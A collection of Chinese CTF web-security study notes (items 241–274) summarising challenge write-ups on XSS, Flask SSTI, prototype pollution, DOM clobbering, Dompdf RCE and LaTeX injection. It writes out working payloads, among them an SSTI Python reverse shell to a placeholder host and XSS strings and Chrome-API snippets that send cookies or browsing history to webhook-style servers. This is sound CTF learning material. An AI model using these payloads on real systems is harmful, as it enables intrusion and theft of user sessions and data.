- 使用vim编辑文件后会额外出现[swap](https://www.baeldung.com/linux/vim-swap-files)文件，为被编辑文件的拷贝，也就是说里面有被编辑文件的内容。swap文件命名遵循以下规律：
```sh
ls -a
. .. file1
vim file1
ls -a
. .. file1 .file1.swp
```
241. [cross-site-python](https://ctftime.org/writeup/37172)
- 利用[PyScript](https://pyscript.net/)进行XSS+沙盒逃逸。pyscript内部有`pyscript.Element`类，允许我们访问+修改DOM里的元素。以下是在无import环境下使用pyscript.Element修改DOM的代码：
```py
but = dict.__base__.__subclasses__()[363]("buttons") #363为pyscript.Element。此处获取按钮
but.element.innerHTML= ''
```
- 当python环境中无builtins时，可以参考这篇[帖子](https://www.reddit.com/r/Python/comments/yaqoux/recovering_cleared_globals_and_builtins)恢复原本的builtins。有了builtins就能正常使用import了。 https://ctftime.org/writeup/37185
- 从pyscript中可以获取js模块，进而可使用js的函数。
```py
js = sys.modules['pyscr' + 'ipt'].js
js.fetch("url" + js.document.cookie)
```
242. [trusted shop](https://ctftime.org/writeup/37177)
- js puppeteer+xss。注意puppeteer基本等于headless chrome，其打开/访问的页面可能会出现xss。反之普通的fetch等访问页面则不会出现。xss的本质是以打开网页的受害者的身份执行js代码，所以可以：
  - 扫描本机端口。代码参考这篇[帖子](https://www.incolumitas.com/2021/01/10/browser-based-port-scanning)。wp里有改动后脚本，将测试数量改为10以求更快的速度（虽然可能出现false positive），同时删除并行（parallel）因为题目服务器无法支持并行的多个同时请求。
  - 发送graphql请求。此处又有一个小技巧：假设网站开启了同源策略（same-origin policy），xss想要发送某些内容到非同源的网站就不能简单使用fetch了，不过可以用form。如果目标网站(比如graphql)只接收json数据该怎么办？如何用html form发送json数据？可以像下面这样：
    ```html
    <form name="myForm" id="myForm" action="url" method="POST" enctype="text/plain">
      <input name='{"variables":{},"' value='":{},"query":"query{findFirstItemOrThrow(where:{id:2}){download}}"}' />
    </form>

    <script>
        window.onload = function(){
        document.forms['myForm'].submit();
        }
    </script>
    ```
    首先`enctype="text/plain"`保证发送的内容不会被urlencode（graphql不会urldecode），然后利用post传参的特点拼出json：`{"variables":{},"=":{},"query":"..."}`。这个技巧要求目标网站不看请求的Content-Type头，单纯尝试接收类似json的数据。
- query-engine（graphql）相关。相关源码可在prisma/prisma-engines仓库找到，其中路由信息可在[这里](https://github.com/prisma/prisma-engines/blob/main/query-engine/query-engine/src/server/mod.rs#L48)找到。
  - query-engine的端口是随机的，在30000到50000之间。
  - mutation更改数据库中数据的请求。`{"variables":{},"query":"mutation {\n  updateManyItem(data: { price: {set: 0}  }, where: { id: 2 }) { count }}"}`。将id为2的物品价格设为0，当然不同题目的参数不一样。若服务器返回`QueryError(SqliteFailure(Error{ code: ReadOnly, extended_code: 8 }, ...)`，说明背后的数据库不允许当前用户改动数据，readonly。
243. [wanky mail](https://ctftime.org/writeup/37173)
- python flask ssti.即使是像下面的函数一样尝试用`{% raw %}`包裹未经过滤的字符串，仍然有注入风险。
    ```py
    def esc(s: str):
        return "{% raw %}" + s + "{% endraw %}"
    ```
    闭合即可。`{% endraw %}{{ code }}{% raw %}`
  - ssti注入payload：
    - `{{ get_flashed_messages.__globals__.__builtins__.__import__("os").listdir() }}`
    - `{{ get_flashed_messages.__globals__.__builtins__.open("flag.txt").read() }}`
    - `{{ ''.__class__.__base__.__subclasses__()[352](["python", "-c", "import socket,os,pty;s=socket.socket();s.connect(('ip',port));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn('/bin/sh')"]) }}`:反弹shell
    - `{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('cat flag.txt').read()}}{%endif%}{% endfor %}`:无需另外爆破索引
    - `{{''.__class__.__mro__[1].__subclasses__()[352]("cat /flag*", shell=True, stdout=-1).communicate()}}`
    - `{{ request.__class__._load_form_data.__globals__.__builtins__.open("flag.txt").read() }}`
- python与SMTP服务器进行交互。
    ```py
    import smtplib
    msg=
    smtplib.SMTP('domain',8025).sendmail(
        'sender', 
        'receiver',
        msg
    )
    ```
    ```py
    from pwn import *
    def send_mail(content, address):
        r = remote("domain", 25)
        r.newline = b"\r\n"
        r.recvline()
        r.sendline(b"HELO domain")
        r.recvline()
        r.sendline(b"MAIL FROM:" + address.encode() + b"@domain")
        r.recvline()
        r.sendline(b"RCPT TO:" + address.encode() + b"@domain")
        r.recvline()
        r.sendline(b"DATA")
        r.recvline()
        r.sendline(content.encode())
        r.sendline(b"\r\n.")
        r.recvline()
        r.sendline(b"QUIT")
        r.recvline()
        r.close()
    send_mail('', input("address: ").strip())
    ```
244. `*`
245. [Stickers](https://github.com/daffainfo/ctf-writeup/tree/main/NahamCon%20CTF%202023/Stickers)
- CVE-2022-28368 - [Dompdf RCE利用](https://www.optiv.com/insights/source-zero/blog/exploiting-rce-vulnerability-dompdf)。使用工具： https://github.com/rvizx/CVE-2022-28368/tree/main 。`python3 dompdf-rce.py --inject "将html转为pdf的url" --dompdf "http://vuln/dompdf/"`。该payload可以反弹shell。
	- `Unable to stream pdf:headers already sent`为dompdf的错误提示。还有另一种方法判断：由dompdf生成出来的pdf的exif Producer字段会写dompdf的版本。
    - 使用php版本的[poc](https://github.com/positive-security/dompdf-rce)：https://github.com/spencerja/NahamConCTF_2023_Writeup/blob/main/Web/Stickers.md
    - 详细步骤： https://meashiri.github.io/ctf-writeups/posts/202306-nahamcon/#stickers ， https://v3he.io/posts/nahamcon-ctf-2023-stickers/
    - 视频讲解： https://www.youtube.com/watch?v=fUiHQS85vlQ&list=PLldZ8EeOcu7fbu4tdAzVxVxJBr0RLnloa&index=5
246. [Marmalade 5](https://github.com/LazyTitan33/CTF-Writeups/blob/main/Nahamcon-2023/Web/Marmalade_5.md)
- jwt MD5_HMAC爆破
    - python字典无第三方库爆破。解析： https://github.com/Crypto-Cat/CTF/blob/main/ctf_events/nahamcon_23/web/marmalade_5.md
    - john 字典爆破jwt。 https://github.com/D13David/ctf-writeups/tree/main/nahamcon23/web/marmalade5
    - c#脚本爆破： https://github.com/g0ttfrid/CTF-Writeups/tree/master/NahamCon%202023/Marmalade%205
247. [Museum](https://github.com/LazyTitan33/CTF-Writeups/blob/main/Nahamcon2023/Web/Museum.md)
- 本地文件包含（LFI）+ssrf。
- fuzz工具[ffuf](https://github.com/ffuf/ffuf)+字典[SecLists](https://github.com/danielmiessler/SecLists/tree/master)（可用来测试文件包含）
- 文件包含可以尝试在路径前添加`/./`,或者`//etc/passwd`。总之多试一下这种奇怪的url。 https://github.com/SQLKinkjection/Writeups/blob/main/2023/nahamcon/Web/Museum/Museum.md
248. [Transfer](https://github.com/okadir/CTF-s/tree/main/nahamCon-2023/Transfer)
- python sqlite注意事项：
```py
c.executescript(sql)
res = c.fetchone()
```
以上代码永远无法查询出结果，除非把executescript换成execute。同时需要注意的是，executescript允许同时执行多条语句，可能会有堆叠注入。
- python pickle反序列化RCE reverse shell。即使在目标机器curl，wget和nc均没有的情况下，仍然可以通过python命令反弹shell。
249. [Pirates/Supplier](https://medium.com/@williamhanugra/nahamcon-ctf-2023-a32d4ca46132)
- Gitea(< 1.16.7) RCE:[CVE-2022-30781](https://tttang.com/archive/1607/)利用。有两种利用方式：
    - 手动创建一个HTTP服务，配置endpoint从而伪装一个Gitea实例
    - 使用自己机器上的msf自动加载payload。不过这样就要VPS了
- [drone](https://ijayer.github.io/post/tech/devops/cicd/20180925-cicd-03-drone-01-basic/):drone.yml文件中的steps下的命令会在有push到main时被调用。devOps相关的挑战可以先看这个文件，了解pipeline是如何运作的。
- Makefile内部执行系统命令，不要随便make来源不明的Makefile。同理，攻击者也可以通过修改Makefile达到执行命令的目的。
250. [fancier-page](https://github.com/hsncsclub/hsctf-10-challenges/tree/main/web/fancier-page),[wp](https://sm-optimizes.amateurs-team.pages.dev/writeups/HSCTF-2023/fancier-page)
- [arg.js](https://github.com/stretchr/arg.js/)导致的js原型链污染。arg.js功能十分强大，可以直接从url传参一个object或是list，关键是键名可以随意控制，于是易污染`__proto__`.
251. [Biohazard](https://github.com/google/google-ctf/tree/main/2023/quals/web-biohazard)
- [strict CSP](https://www.w3.org/TR/CSP3/#strict-csp)（满足特定条件的CSP才能被称为strict）+[Trusted Types](https://juejin.cn/post/6978694516840595487)(也是CSP的一部分，是个header，禁止一些危险的API被浏览器调用)不一定能完全防止xss。[Dom clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)+[prototype pollution](https://portswigger.net/web-security/prototype-pollution)/外部库的错误使用通常是入手点
- 接着第234点提过的，Object.assign通常没有原型链污染
```js
Object.assign({}, JSON.parse('{"__proto__":{"polluted": true}}'));
console.log(Object.prototype.polluted); // undefined
```
但是也有例外。若assign的第一个参数是Object.prototype，污染就成立了。
```js
Object.assign(({})['__proto__'], JSON.parse('{"polluted": true}'));
console.log(Object.prototype.polluted); // true
```
- [closure sanitizer](https://google.github.io/closure-library/api/goog.html.sanitizer.HtmlSanitizer.html)可利用原型链污染绕过：https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has 。此时一般已经有xss了，除非像这题一样开了Strict CSP 和 Trusted Types，没法直接写payload，只能利用原型链污染使用网页本来就有的内容实现xss
- `bootstrap.js`里的内容可自定义，通常为调试所用，不为题目的一部分。但也不能完全排除这种可能性，因为这题的漏洞就从`bootstrap.js`里开始。
- iframe标签有个csp属性，设置被引用内容的csp。违反csp的内容将不会正常加载。可以利用这个特点故意阻止目标网页某些资源的加载。
- 这题还有个既不用原型链污染也不用dom clobbering的[非预期解](https://gist.github.com/arkark/340ffadc009a4dd07be6696e0dec4553).查看题目使用的closure库的[源码](https://github.com/shhnjk/closure-library/blob/master/closure/goog/demos/xpc/minimal/index.html)，发现这个index.html是个demo page，作用是在两个不同的网站之间发消息。里面有个log函数：
```js
function log(msg) {
  logEl || (logEl = goog.dom.getElement('log'));

  var msgEl = goog.dom.createDom(goog.dom.TagName.DIV);
  msgEl.innerHTML = msg;
  logEl.insertBefore(msgEl, logEl.firstChild);
}
```
这个函数使用了innerHTML。接着又在下面发现了一个调用log函数的地方。
```html
<p>
<input type="text" id="msgInput" value="Hello from the container page."
    style="width:250px">
<input type="button" value="Send" onclick="
    channel.send('log', goog.dom.getElement('msgInput').value)">
</p>
```
index.html又有个peerdomain参数，用于设置交流的网页的域名。所以这个网页是会被打开的，里面的payload也会被执行。那么按照非预期解里的做法，直接往这里面注入xss就行了，完全不需要预期解里那么麻烦。

252. [Postviewer v2](../../CTF/GoogleCTF/Web/Postviewer%20v2.md).
- In js, a regular expression with a global flag cannot be used indefinitely. It's due to the behavior that after a first successful match, the lastIndex will increase and consecutive searches will yield no matches https://stackoverflow.com/questions/1520800/why-does-a-regexp-with-global-flag-give-wrong-results
- CSP bypass: https://terjanq.medium.com/arbitrary-parentheses-less-xss-e4a1cf37c13d . The idea is to find a subpage without a CSP and execute the payload there. A trick that usually works is to open a page with a very long url that will be blocked on the intermediate proxy side because of the overlong headers. Embedding sbx-anything.postviewer2-web.2023.ctfcompetition.com/AAAAA....AAA would work fine for a long sequence of A's.
-  A window can redirect another window if they are in openee-opener relationship. The trick is to call open('URL', 'iframe') that will create such a relationship with an iframe named iframe (e.g. `<iframe name='iframe'>`). This allows the iframe to redirect its opener without user-interaction.
253. [Under Construction](https://github.com/google/google-ctf/tree/master/2023/web-under-construction)
- HTTP parameter pollution. A HTTP query like a=1&a=2 will be interpreted differently by Flask and PHP running on an Apache HTTP Server. In Flask, the parameter will be 1 (first occurence) while in PHP it will be 2 (last occurence). php与python flask的解析差异。post传参时，若遇见重复的值，php取最后一个，flask取第一个
- 类似题目：[Micro](https://github.com/abdoghazy2015/CTF-Write-Ups/tree/main/0xL4ughCTF2024/Web/Micro)
254. [Veggie Soda](https://github.com/google/google-ctf/tree/master/2023/web-vegsoda)
- 在[Oak](https://github.com/oakserver/oak/tree/main)应用程序中，HEAD请求会被看作GET请求。
- typescript反序列化链（[SuperSerial](https://github.com/denostack/superserial)）利用。类似php的反序列化链，在程序中现成的类中找相同函数名但内容截然不同的类组合在一起。
```
It's worth noting that the other classes actually share function names. They perform different things, but they have similar names - and this typically wouldn't be a problem for a type-cautious language, which has generics to assert types... except that all classes in there aren't generic, so generic constructors can't be used, and therefore the program can't assert types in certain situations when dealing with the serializer. This isn't a problem with the serializer, but rather an oversight into the use of generics and type assertions in TypeScript.
```
SuperSerial不处理函数，所以没法像python的pickle那样直接RCE。

255. [peanut-xss](https://github.com/sigpwny/UIUCTF-2023-Public/tree/main/challenges/web/peanut-xss),[wp](https://hackmd.io/@Solderet/UIUCTF-2023-peanut-xss)
- [nutshell](https://github.com/ncase/nutshell/tree/f49c4fc2da746e8d416dd67db3fd47458067fd25)(< 1.0.7) xss漏洞。
- https://github.com/H31s3n-b3rg/CTF_Write-ups/tree/main/UIUCTF_2023/WEB/Peanut-XSS :innerText property decodes the escaped HTML into real HTML。利用这一点，其实直接用转义过后的`<`和`>`加上img标签即可触发xss： https://www.youtube.com/watch?v=Es2LzEQGwDc
256. [Adminplz](https://github.com/sigpwny/UIUCTF-2023-Public/tree/main/challenges/web/adminplz),[wp](https://github.com/H31s3n-b3rg/CTF_Write-ups/tree/main/UIUCTF_2023/WEB/Adminplz)
- log injection:当日志文件可被当成html渲染且对用户可控的记录内容（如用户名）无过滤时，可以多行注入html代码。比如注册一个用户叫`<head>`，再注册另一个用户叫`</head>`，那么中间的日志内容就会被渲染成head标签的内容，换为其他标签即可实现想要的功能。
- 利用`<meta>`标签的重定向提取admin cookie。`<meta http-equiv="refresh" content='0; url=xxx'>`：访问这个meta tag的用户会被立刻重定向到xxx，可以类似xss那样往外带信息。
- java的app.getResource()函数支持多个协议，如`file://`和`http://`等。参考 https://hackmd.io/@Solderet/UIUCTF2023-adminplz
257. [Future Disk](https://github.com/sigpwny/UIUCTF-2023-Public/tree/main/challenges/web/futuredisk),[wp](https://bronson113.github.io/2023/07/03/uiuctf-2023-writeups.html#future-disk-12-),[wp2](https://www.youtube.com/watch?v=Es2LzEQGwDc&t=724s)(视频)
- gzip文件格式详解：https://commandlinefanatic.com/cgi-bin/showarticle.cgi?article=art053
- curl命令有个`--continued-at`选项，其实本质上是使用了range头
- 利用binary search在超大gzip文件中找到储存指定内容的block并使用zlib解码内容（或者使用这个[文章](https://pyokagan.name/blog/2019-10-18-zlibinflate/)里的deflate）。 Since the file is mostly zero, we can assume the first 9 blocks will follow a pretty regular sequence. then there will be one block of a irregular size to store the flag, and the rest of the block back to the regular format. This means that if we can find the block header at the location we expects it, we haven't reach the block containing the flag. Conversely, if we can't find the block header, we have passed the flag block. The only challenge now is to calculate where the header bytes are.
- 其他wp： https://hackmd.io/@pilvar/ByznZMLF3
258. [Rose](https://hackmd.io/@taiwhis/tenable_ctf_2023#Rose)
- flask的flask_login以及`@login_required`装饰器依赖客户端的session cookie。只要获取到secret key后，即可伪造登录后的cookie。`{'_id': '733e330a7ec9ed6ea424339019f73647f4f22319da996eaf78681272ca26abade76c7a9a39a9d707694d6f8f6029c04482e187b5d984638a563f715026db9c96', '_user_id': '1'}`. `_id`和`_user_id`是必须的，用于标记已登录（或者说绕过`@login_required`保护的页面），除此之外还可以加其他题目需要的内容
    - https://github.com/Connor-Maddison/ctf_event_writeups/blob/main/tenable_ctf_2023/rose/Rose_writeup.md ：似乎在session里加上`'is_authenticated': True, '_user_id': '1'`也是可以的
259. [Bad Waf No Donut](https://ctftime.org/writeup/37739)
- [unicode-normalization](https://hacktricks.boitatech.com.br/pentesting-web/unicode-normalization-vulnerability):字符串经过unicode标准化后，某些不一样的unicode字符最后会标准化成一个。可利用这个特点绕过一些waf和过滤。unicode参考： https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html ， https://qaz.wtf/u/convert.cgi
- 类似知识点的题目：[World Wide Email Search](https://www.thesecuritywind.com/post/world-wide-ctf-2024-world-wide-email-search-web)，利用python的标准化插入引号进而引发sql注入。顺便记录一下看到的好玩意
    - 各类网站架构的默认404页面： https://0xdf.gitlab.io/cheatsheets/404
    - https://book.hacktricks.xyz/pentesting-web/unicode-injection/unicode-normalization
    - https://book.hacktricks.xyz/pentesting-web/phone-number-injections
    - https://book.hacktricks.xyz/pentesting-web/email-injections
260. [sequence_gallery](https://siunam321.github.io/ctf/CrewCTF-2023/Web/sequence_gallery/)
- linux dc命令参数注入导致的rce。`-e`选项可以执行一个表达式，但当表达式中出现`!`时，会将剩余的语句当作系统命令执行。
    - `-e"!cat$IFS*.txt%0A`：第一个`"`用于分割命令（这种情况下不是必须的，详情见文档。本来标准是用空格的，这里绕过滤），`$IFS`表示空格也是绕过滤，`%0A`表示换行，不换行命令是不会执行的
    - `-e!cat${IFS}fl*;#`
261. `*`
262. `*`
263. `*`
264. [Safe Proxy](https://untrue.me/writeups/crewctf2023/safe-proxy/)
- [deno](https://github.com/denoland/deno)(A modern runtime for JavaScript and TypeScript)允许fetch函数的参数为`file://`，即可以通过fetch获取本地文件。
- `$DENO_DIR`默认为`$HOME/.deno`
- https://denolib.gitbook.io/guide/advanced/deno_dir-code-fetch-and-cache ：`$DENO_DIR/deps` is used to store files fetched through remote url import. It contains subfolders based on url scheme (currently only http and https), and store files to locations based on the URL path. 例如，`import {xxx} from "http://host:8082/?token=abc";`，则文件出现于`$DENO_DIR/deps/http/host_PORT8082/`。另外，根据 https://github.com/denoland/deno/blob/21cc279481ac5bffc29641e917e868dca42189d3/cli/cache/http_cache.rs#L69 ，文件名需要hash。因此文件的完整路径为`$DENO_DIR/deps/http/host_PORT8082/fe9300653ae3ecb588a5562dc46e30e3ded89c07dbdbb3d86f2f47a5dc7dde3c`(`fe9300653ae3ecb588a5562dc46e30e3ded89c07dbdbb3d86f2f47a5dc7dde3c=sha256(b"/?token=abc").hexdigest()`)
- 在`deno/`文件夹下有个`dep_analysis_cache_v1`文件，a sqlite database storing information about the imported modules. This file contains the full url used when making the requestThis file contains the full url used when making the request, 包括port和get参数
265. [Hex2Dec](https://github.com/L-T-B/CTFS/blob/main/crew-ctf/web/hex2dec.md)
- 使用“0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcde +-”的字符集构建xss代码。以下是一些构造的技巧
    - 调用函数时括号不是必须的。如"alert`XSS`"等于`alert("XSS")`。更多参考 https://stackoverflow.com/questions/35949554/invoking-a-function-without-parentheses
    - 可以用方括号访问属性。 https://dmitripavlutin.com/access-object-properties-javascript/
    - 可以用元素的id访问html里的元素。假设有一个div元素`<DIV ID=XSS>`（无需`</div>`，大小写不重要），则在js里可以通过XSS来获取这个元素。配合上一点，"XSS[`ownerDocument`]"能获取到Document元素（使用`号还是引号'不重要）
    - jsfuck构造任意字符技巧： https://github.com/aemkei/jsfuck 。不过需要的字符很多，而且要eval，若csp不允许eval则无法使用。里面的字符构造技巧还是值得参考的。相关链接： https://stackoverflow.com/questions/63673610/alternative-way-to-get-c-letter-in-jsfuck
- 其他payload
    ```html
    <DIV ID=XSS><IMG SRC=X ONERROR=A=`a`;B=`b`;C=`c`;D=`d`;E=`e`;F=`f`;INF=+`1e10001`;INFSTR=INF+[];I=INFSTR[3];N=INFSTR[1];T=INFSTR[6];Y=INFSTR[7];FALSE=1==0;FALSE=FALSE+[];L=FALSE[2];S=FALSE[3];TRUE=1==1;TRUE=TRUE+[];R=TRUE[1];U=TRUE[2];FLAT=[][F+L+A+T];FLAT=FLAT+[];O=FLAT[6];V=FLAT[27];EMPTYSTRING=[]+[];STRING=EMPTYSTRING[C+O+N+S+T+R+U+C+T+O+R];STRINGSTR=STRING+[];G=STRINGSTR[14];NUMBER=0[C+O+N+S+T+R+U+C+T+O+R];NUMBER=NUMBER+[];M=NUMBER[11];G=STRING[N+A+M+E][5];H=101[T+O+`S`+T+R+I+N+G]`21`[1];K=20[T+O+`S`+T+R+I+N+G]`21`;P=211[T+O+`S`+T+R+I+N+G]`31`[1];Q=212[T+O+`S`+T+R+I+N+G]`31`[1];V=31[T+O+`S`+T+R+I+N+G]`32`;W=32[T+O+`S`+T+R+I+N+G]`33`;X=101[T+O+`S`+T+R+I+N+G]`34`[1];Z=35[T+O+`S`+T+R+I+N+G]`36`;ARRAYITER=[]+[][E+N+T+R+I+E+S]``;J=ARRAYITER[3];PERIOD=+`11e100`+[];PERIOD=PERIOD[1];FORWARDSLASH=STRING[F+R+O+M+`C`+H+A+R+`C`+O+D+E]`47`;XSS[O+W+N+E+R+`D`+O+C+U+M+E+N+T][L+O+C+A+T+I+O+N]=FORWARDSLASH+FORWARDSLASH+Y+Z+3+0+J+S+Y+L+PERIOD+R+E+Q+U+E+S+T+R+E+P+O+PERIOD+C+O+M+`?`+XSS[O+W+N+E+R+`D`+O+C+U+M+E+N+T][C+O+O+K+I+E]>
    ```
    ```py
    def gen_str(s):
    chars = []
    for c in s:
        if c.islower():
            idx = ord(c) - ord("a")
            chars.append(f"X[{idx}]")
        elif c == "`":
            chars.append(f"`\\``")
        elif c == "\\":
            chars.append(f"`\\\\`")
        else:
            chars.append(f"`{c}`")
    return "+".join(chars)
    def gen_unicode_str(s):
        return "".join([f"\\u{ord(c):04X}" for c in s]) #将参数表示成\uxxxx的形式
    webhook = "https://webhook.example.com/?"
    payload = "<A ID=A HREF=ABCDEFGHIJKLMNOPQRSTUVWXYZ:>" #这里A标签的id是A，所以js里可以用A访问。下面A+``直接获取到HREF内容的小写
    payload += "<IMG SRC ONERROR="
    payload += "X=A+``;"
    payload += f"HREF={gen_str('href')};"
    payload += f"CLICK={gen_str('click')};"
    payload += f"COOKIE={gen_str('cookie')};"
    payload += f"A[HREF]={gen_str(f'javascript:location[HREF]=`{gen_unicode_str(webhook)}`+document[COOKIE]')};"
    payload += f"A[CLICK]``;"
    payload += ">"
    print(payload)
    ```
    ```html
    <K ID=A><DIV ID=B><IMG SRC ID=AA ONERROR=DOT=[A[[A+[]][0][1]+[A+[]][0][17]+[A+[]][0][18]+[A+[]][0][4]+[[1==1]+[]][0][1]+[B+[]][0][12]+[A+[]][0][1]+[A+[]][0][5]+[[][[]]+[]][0][0]+[A+[]][0][22]+[A+[]][0][4]+[A+[]][0][18]+[A+[]][0][25]][[A+[]][0][20]+[A+[]][0][1]+[A+[]][0][5]+[[1<1]+[]][0][1]+[A+[]][0][25]+[B+[]][0][13]+[A+[]][0][1]+[A+[]][0][18]]+[]][0];AA[[A+[]][0][1]+[A+[]][0][17]+[A+[]][0][18]+[A+[]][0][4]+[[1==1]+[]][0][1]+[B+[]][0][12]+[A+[]][0][1]+[A+[]][0][5]+[[][[]]+[]][0][0]+[A+[]][0][22]+[A+[]][0][4]+[A+[]][0][18]+[A+[]][0][25]][[A+[]][0][20]+[A+[]][0][1]+[A+[]][0][5]+[[1<1]+[]][0][1]+[A+[]][0][25]+[B+[]][0][13]+[A+[]][0][1]+[A+[]][0][18]]=`HTTPS:`+DOT[5]+DOT[5]+`IMBRIUM`+DOT[18]+`SERVEO`+DOT[18]+`NET?C=`+AA[[A+[]][0][1]+[A+[]][0][17]+[A+[]][0][18]+[A+[]][0][4]+[[1==1]+[]][0][1]+[B+[]][0][12]+[A+[]][0][1]+[A+[]][0][5]+[[][[]]+[]][0][0]+[A+[]][0][22]+[A+[]][0][4]+[A+[]][0][18]+[A+[]][0][25]][[A+[]][0][5]+[A+[]][0][1]+[A+[]][0][1]+[A+[]][0][14]+[B+[]][0][13]+[A+[]][0][4]]>
    ```
266. 测试xss时，payload不要只用简单的`alert(1)`,建议用`alert(document.domain)`和`alert(window.origin)`，这些payload可以反馈payload被执行的位置。 https://liveoverflow.com/do-not-use-alert-1-in-xss/
267. [jqi](https://github.com/zer0pts/zer0pts-ctf-2023-public/tree/master/web/jqi),[wp](https://nanimokangaeteinai.hateblo.jp/entry/2023/07/17/101119#Web-149-jqi-40-solves)
- [node-jq](https://github.com/sanack/node-jq)（语法和[jq](https://jqlang.github.io/jq/manual/v1.6/)一样，node-jq其实是个node js wrapper） error based（盲注）注入。引发的原因和sql注入一样，没有对用户的输入进行过滤就直接拼接上query语句。查询条件之间用`|`分割,可以用引号或者[string interpolation](https://jqlang.github.io/jq/manual/v1.6/#string-interpolation)或者`\`（要求插入的内容正好在引号的前面，从而转义引号）逃逸从而插入恶意的条件
    - error based注入基于无查询内容回显的题目。可以利用if-then-else语句构造1/0来引发错误，或者直接error函数。
    - 可以在jq里直接访问环境变量
268. [neko-note](https://github.com/zer0pts/zer0pts-ctf-2023-public/tree/master/web/neko-note),[wp](https://nanimokangaeteinai.hateblo.jp/entry/2023/07/17/101119#Web-181-Neko-Note-26-solves)
- go web应用下的xss。本题的xss基于attribute injection。程序将用户输入作为字符串插入a标签的属性，但属性没有加双引号，导致用户可以逃逸出当前属性，添加可触发xss的属性。如onanimationend+style属性：`onanimationend=alert(1) style=animation-name:wag;animation-duration:0s`(要求引入的css里有个名为wag的`@keyframes`),或者onmouseover：`onmouseover=alert(1)`(要求admin bot有点击a标签的操作)
    - 若bot输入我们要泄露的敏感内容后又删除：
        ```js
        await page.focus('input');
        for (let i = 0; i < len; i++) {
            await page.keyboard.press('Backspace');
        }
        ```
        可以用`document.execCommand('undo');`将刚才删除的内容恢复回来
    - 带出敏感信息除了可以用location，fetch，还能用[navigator.sendBeacon](https://developer.mozilla.org/en-US/docs/Web/API/Navigator/sendBeacon)
269. [plain-blog](https://github.com/zer0pts/zer0pts-ctf-2023-public/tree/e9f71aeaab764d36ce9378b1f079af8fd4651bdc/web/plain-blog)
- 后端ruby+前端js web应用。不对用户可控数据进行过滤导致的原型链污染。
    ```js
    let posts = {};
    post = posts[id];
    ```
    这里用户若可随意控制id，可让id=`__proto__`，这样`posts[__proto__]`获取到的就是Object.prototype了。
    - 一种利用方式是用在fetch。当我们污染了`Object.prototype.headers`，就算调用fetch函数时options里没有headers，被污染的headers仍然会一并发出去。一个好用的header是[X-HTTP-Method-Override](https://www.sidechannel.blog/en/http-method-override-what-it-is-and-how-a-pentester-can-use-it/)（参考 https://github.com/rack/rack/blob/54990d39446caf046b5cbf19fd030204f850b480/lib/rack/method_override.rb#L31-L40 ，ruby的web模块会用这个header），假设用户`POST xxx`,但是加上了`X-HTTP-Method-Override: PUT`，那么服务器那边最终收到的是PUT。
- 每次请求数据都应刷新。
    ```js
    let posts = {}, data, post;
    for (const id of ids) {
        const res = await (await request('GET', `/api/post/${id}`)).json();
        if (res.post) {
            data = res.post;
        }
        //do something with data
    }
    ```
    若用户构造不存在的id，data就不会被更新，而是继承了之前的值，属于逻辑错误。
- ruby里的params['permission']包含请求参数，不仅仅是request body and path parameters
270. [ringtone](https://github.com/zer0pts/zer0pts-ctf-2023-public/tree/master/web/ringtone)
- 当题目用上DomPurify而目标是进行xss时，有以下两种可能：
    - dompurify不是最新版本，可用旧版的漏洞绕过（基本不考虑要求找0day）
    - dompurify是最新版本且没有已知漏洞，那么漏洞出在题目的其他代码，考虑其他代码的漏洞，尤其是dom clobbering
- dom clobbering的复杂情况。`users.privileged.dataset.admin`如何用html代码表示？`<form id=users><img name=privileged data-admin="value"></form>`是一种，也可以用:
    ```html
    <div id=users></div>
    <div id=users name=privileged data-admin="value"></div>
    ```
    注意两个`<div>`是必须的，一个div是取不到的。dataset是一个特殊的属性，可以取到任何以`data-`开头的attribute的值，参考 https://developer.mozilla.org/en-US/docs/Learn/HTML/Howto/Use_data_attributes
- xss js（chrome api）相关
    - 调用history api获取历史打开的tab的url
        ```js
        chrome.history.search({text:``,maxResults:10},function(data){data.forEach(function(page){fetch(`http://YOURSERVER?a=`%2Bpage.url);});});
        ```
    - 创建一个new tab
        ```js
        t=chrome.tabs.create({url:"url"})
        ```
    - 对指定tab id的tab的可见部分截图并带出webhook
        ```js
        chrome.tabs.captureVisibleTab(windowId).then(function(data){fetch("url",{method:/POST/.source,body:data})})
        ```
271. [Warmuprofile](https://blog.arkark.dev/2023/07/17/zer0pts-ctf/)
- 处理多线程很麻烦，如果只是一些简单的操作(shell用命令直接实现的)，直接用python的`subprocess.run`就好了。或者直接用shell命令：https://stackoverflow.com/questions/46362284/run-multiple-curl-commands-in-parallel ，简单的条件竞争可以用
272. [latek](https://github.com/D13David/ctf-writeups/tree/main/amateursctf23/web/latek)
- [Latex injection](https://salmonsec.com/cheatsheets/exploitation/latex_injection)
    - 其它payload
        ```latex
        \documentclass{article}
        \usepackage{verbatim}
        \begin{document} 
        \verbatiminput{/flag.txt}
        \end{document} 
        ```
        - 单纯`\input{/flag.txt}`可能读不全文件，加个batchmode即可
        ```latex
        \batchmode
        \input{/flag.txt}
        ```
        类似的还有以下payload，也会把flag内容渲染到pdf但是有格式（比如flag内容有latex语法就会把latex二次渲染后的渲染上）
        ```latex
        \documentclass{article}
        \begin{document}
        $\input{/flag.txt}$
        \end{document}
        ```
        - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection
        - https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection#latex-injection
273. [uwuctf](https://github.com/L-T-B/CTFS/blob/main/amateursCTF/web/uwuctf.md)
- `cat [filename]|xxx`，若filename可控制，尝试在文件名后加个null字符(\x00,%00)就可以截断命令，cat出来的文件内容不会进入后续xxx命令
274. [sanity](https://github.com/Crypto-Cat/CTF/blob/main/ctf_events/amateurs_23/web/sanity.md)
- dom clobbering+原型链污染
    - `window.debug.extension.toString()`可用`<a id="debug"></a><a id="debug" name="extension" href="content"></a>` clobber，获取的内容为content
    - dompurify预防dom clobbering，但chrome的Sanitizer暂时不能
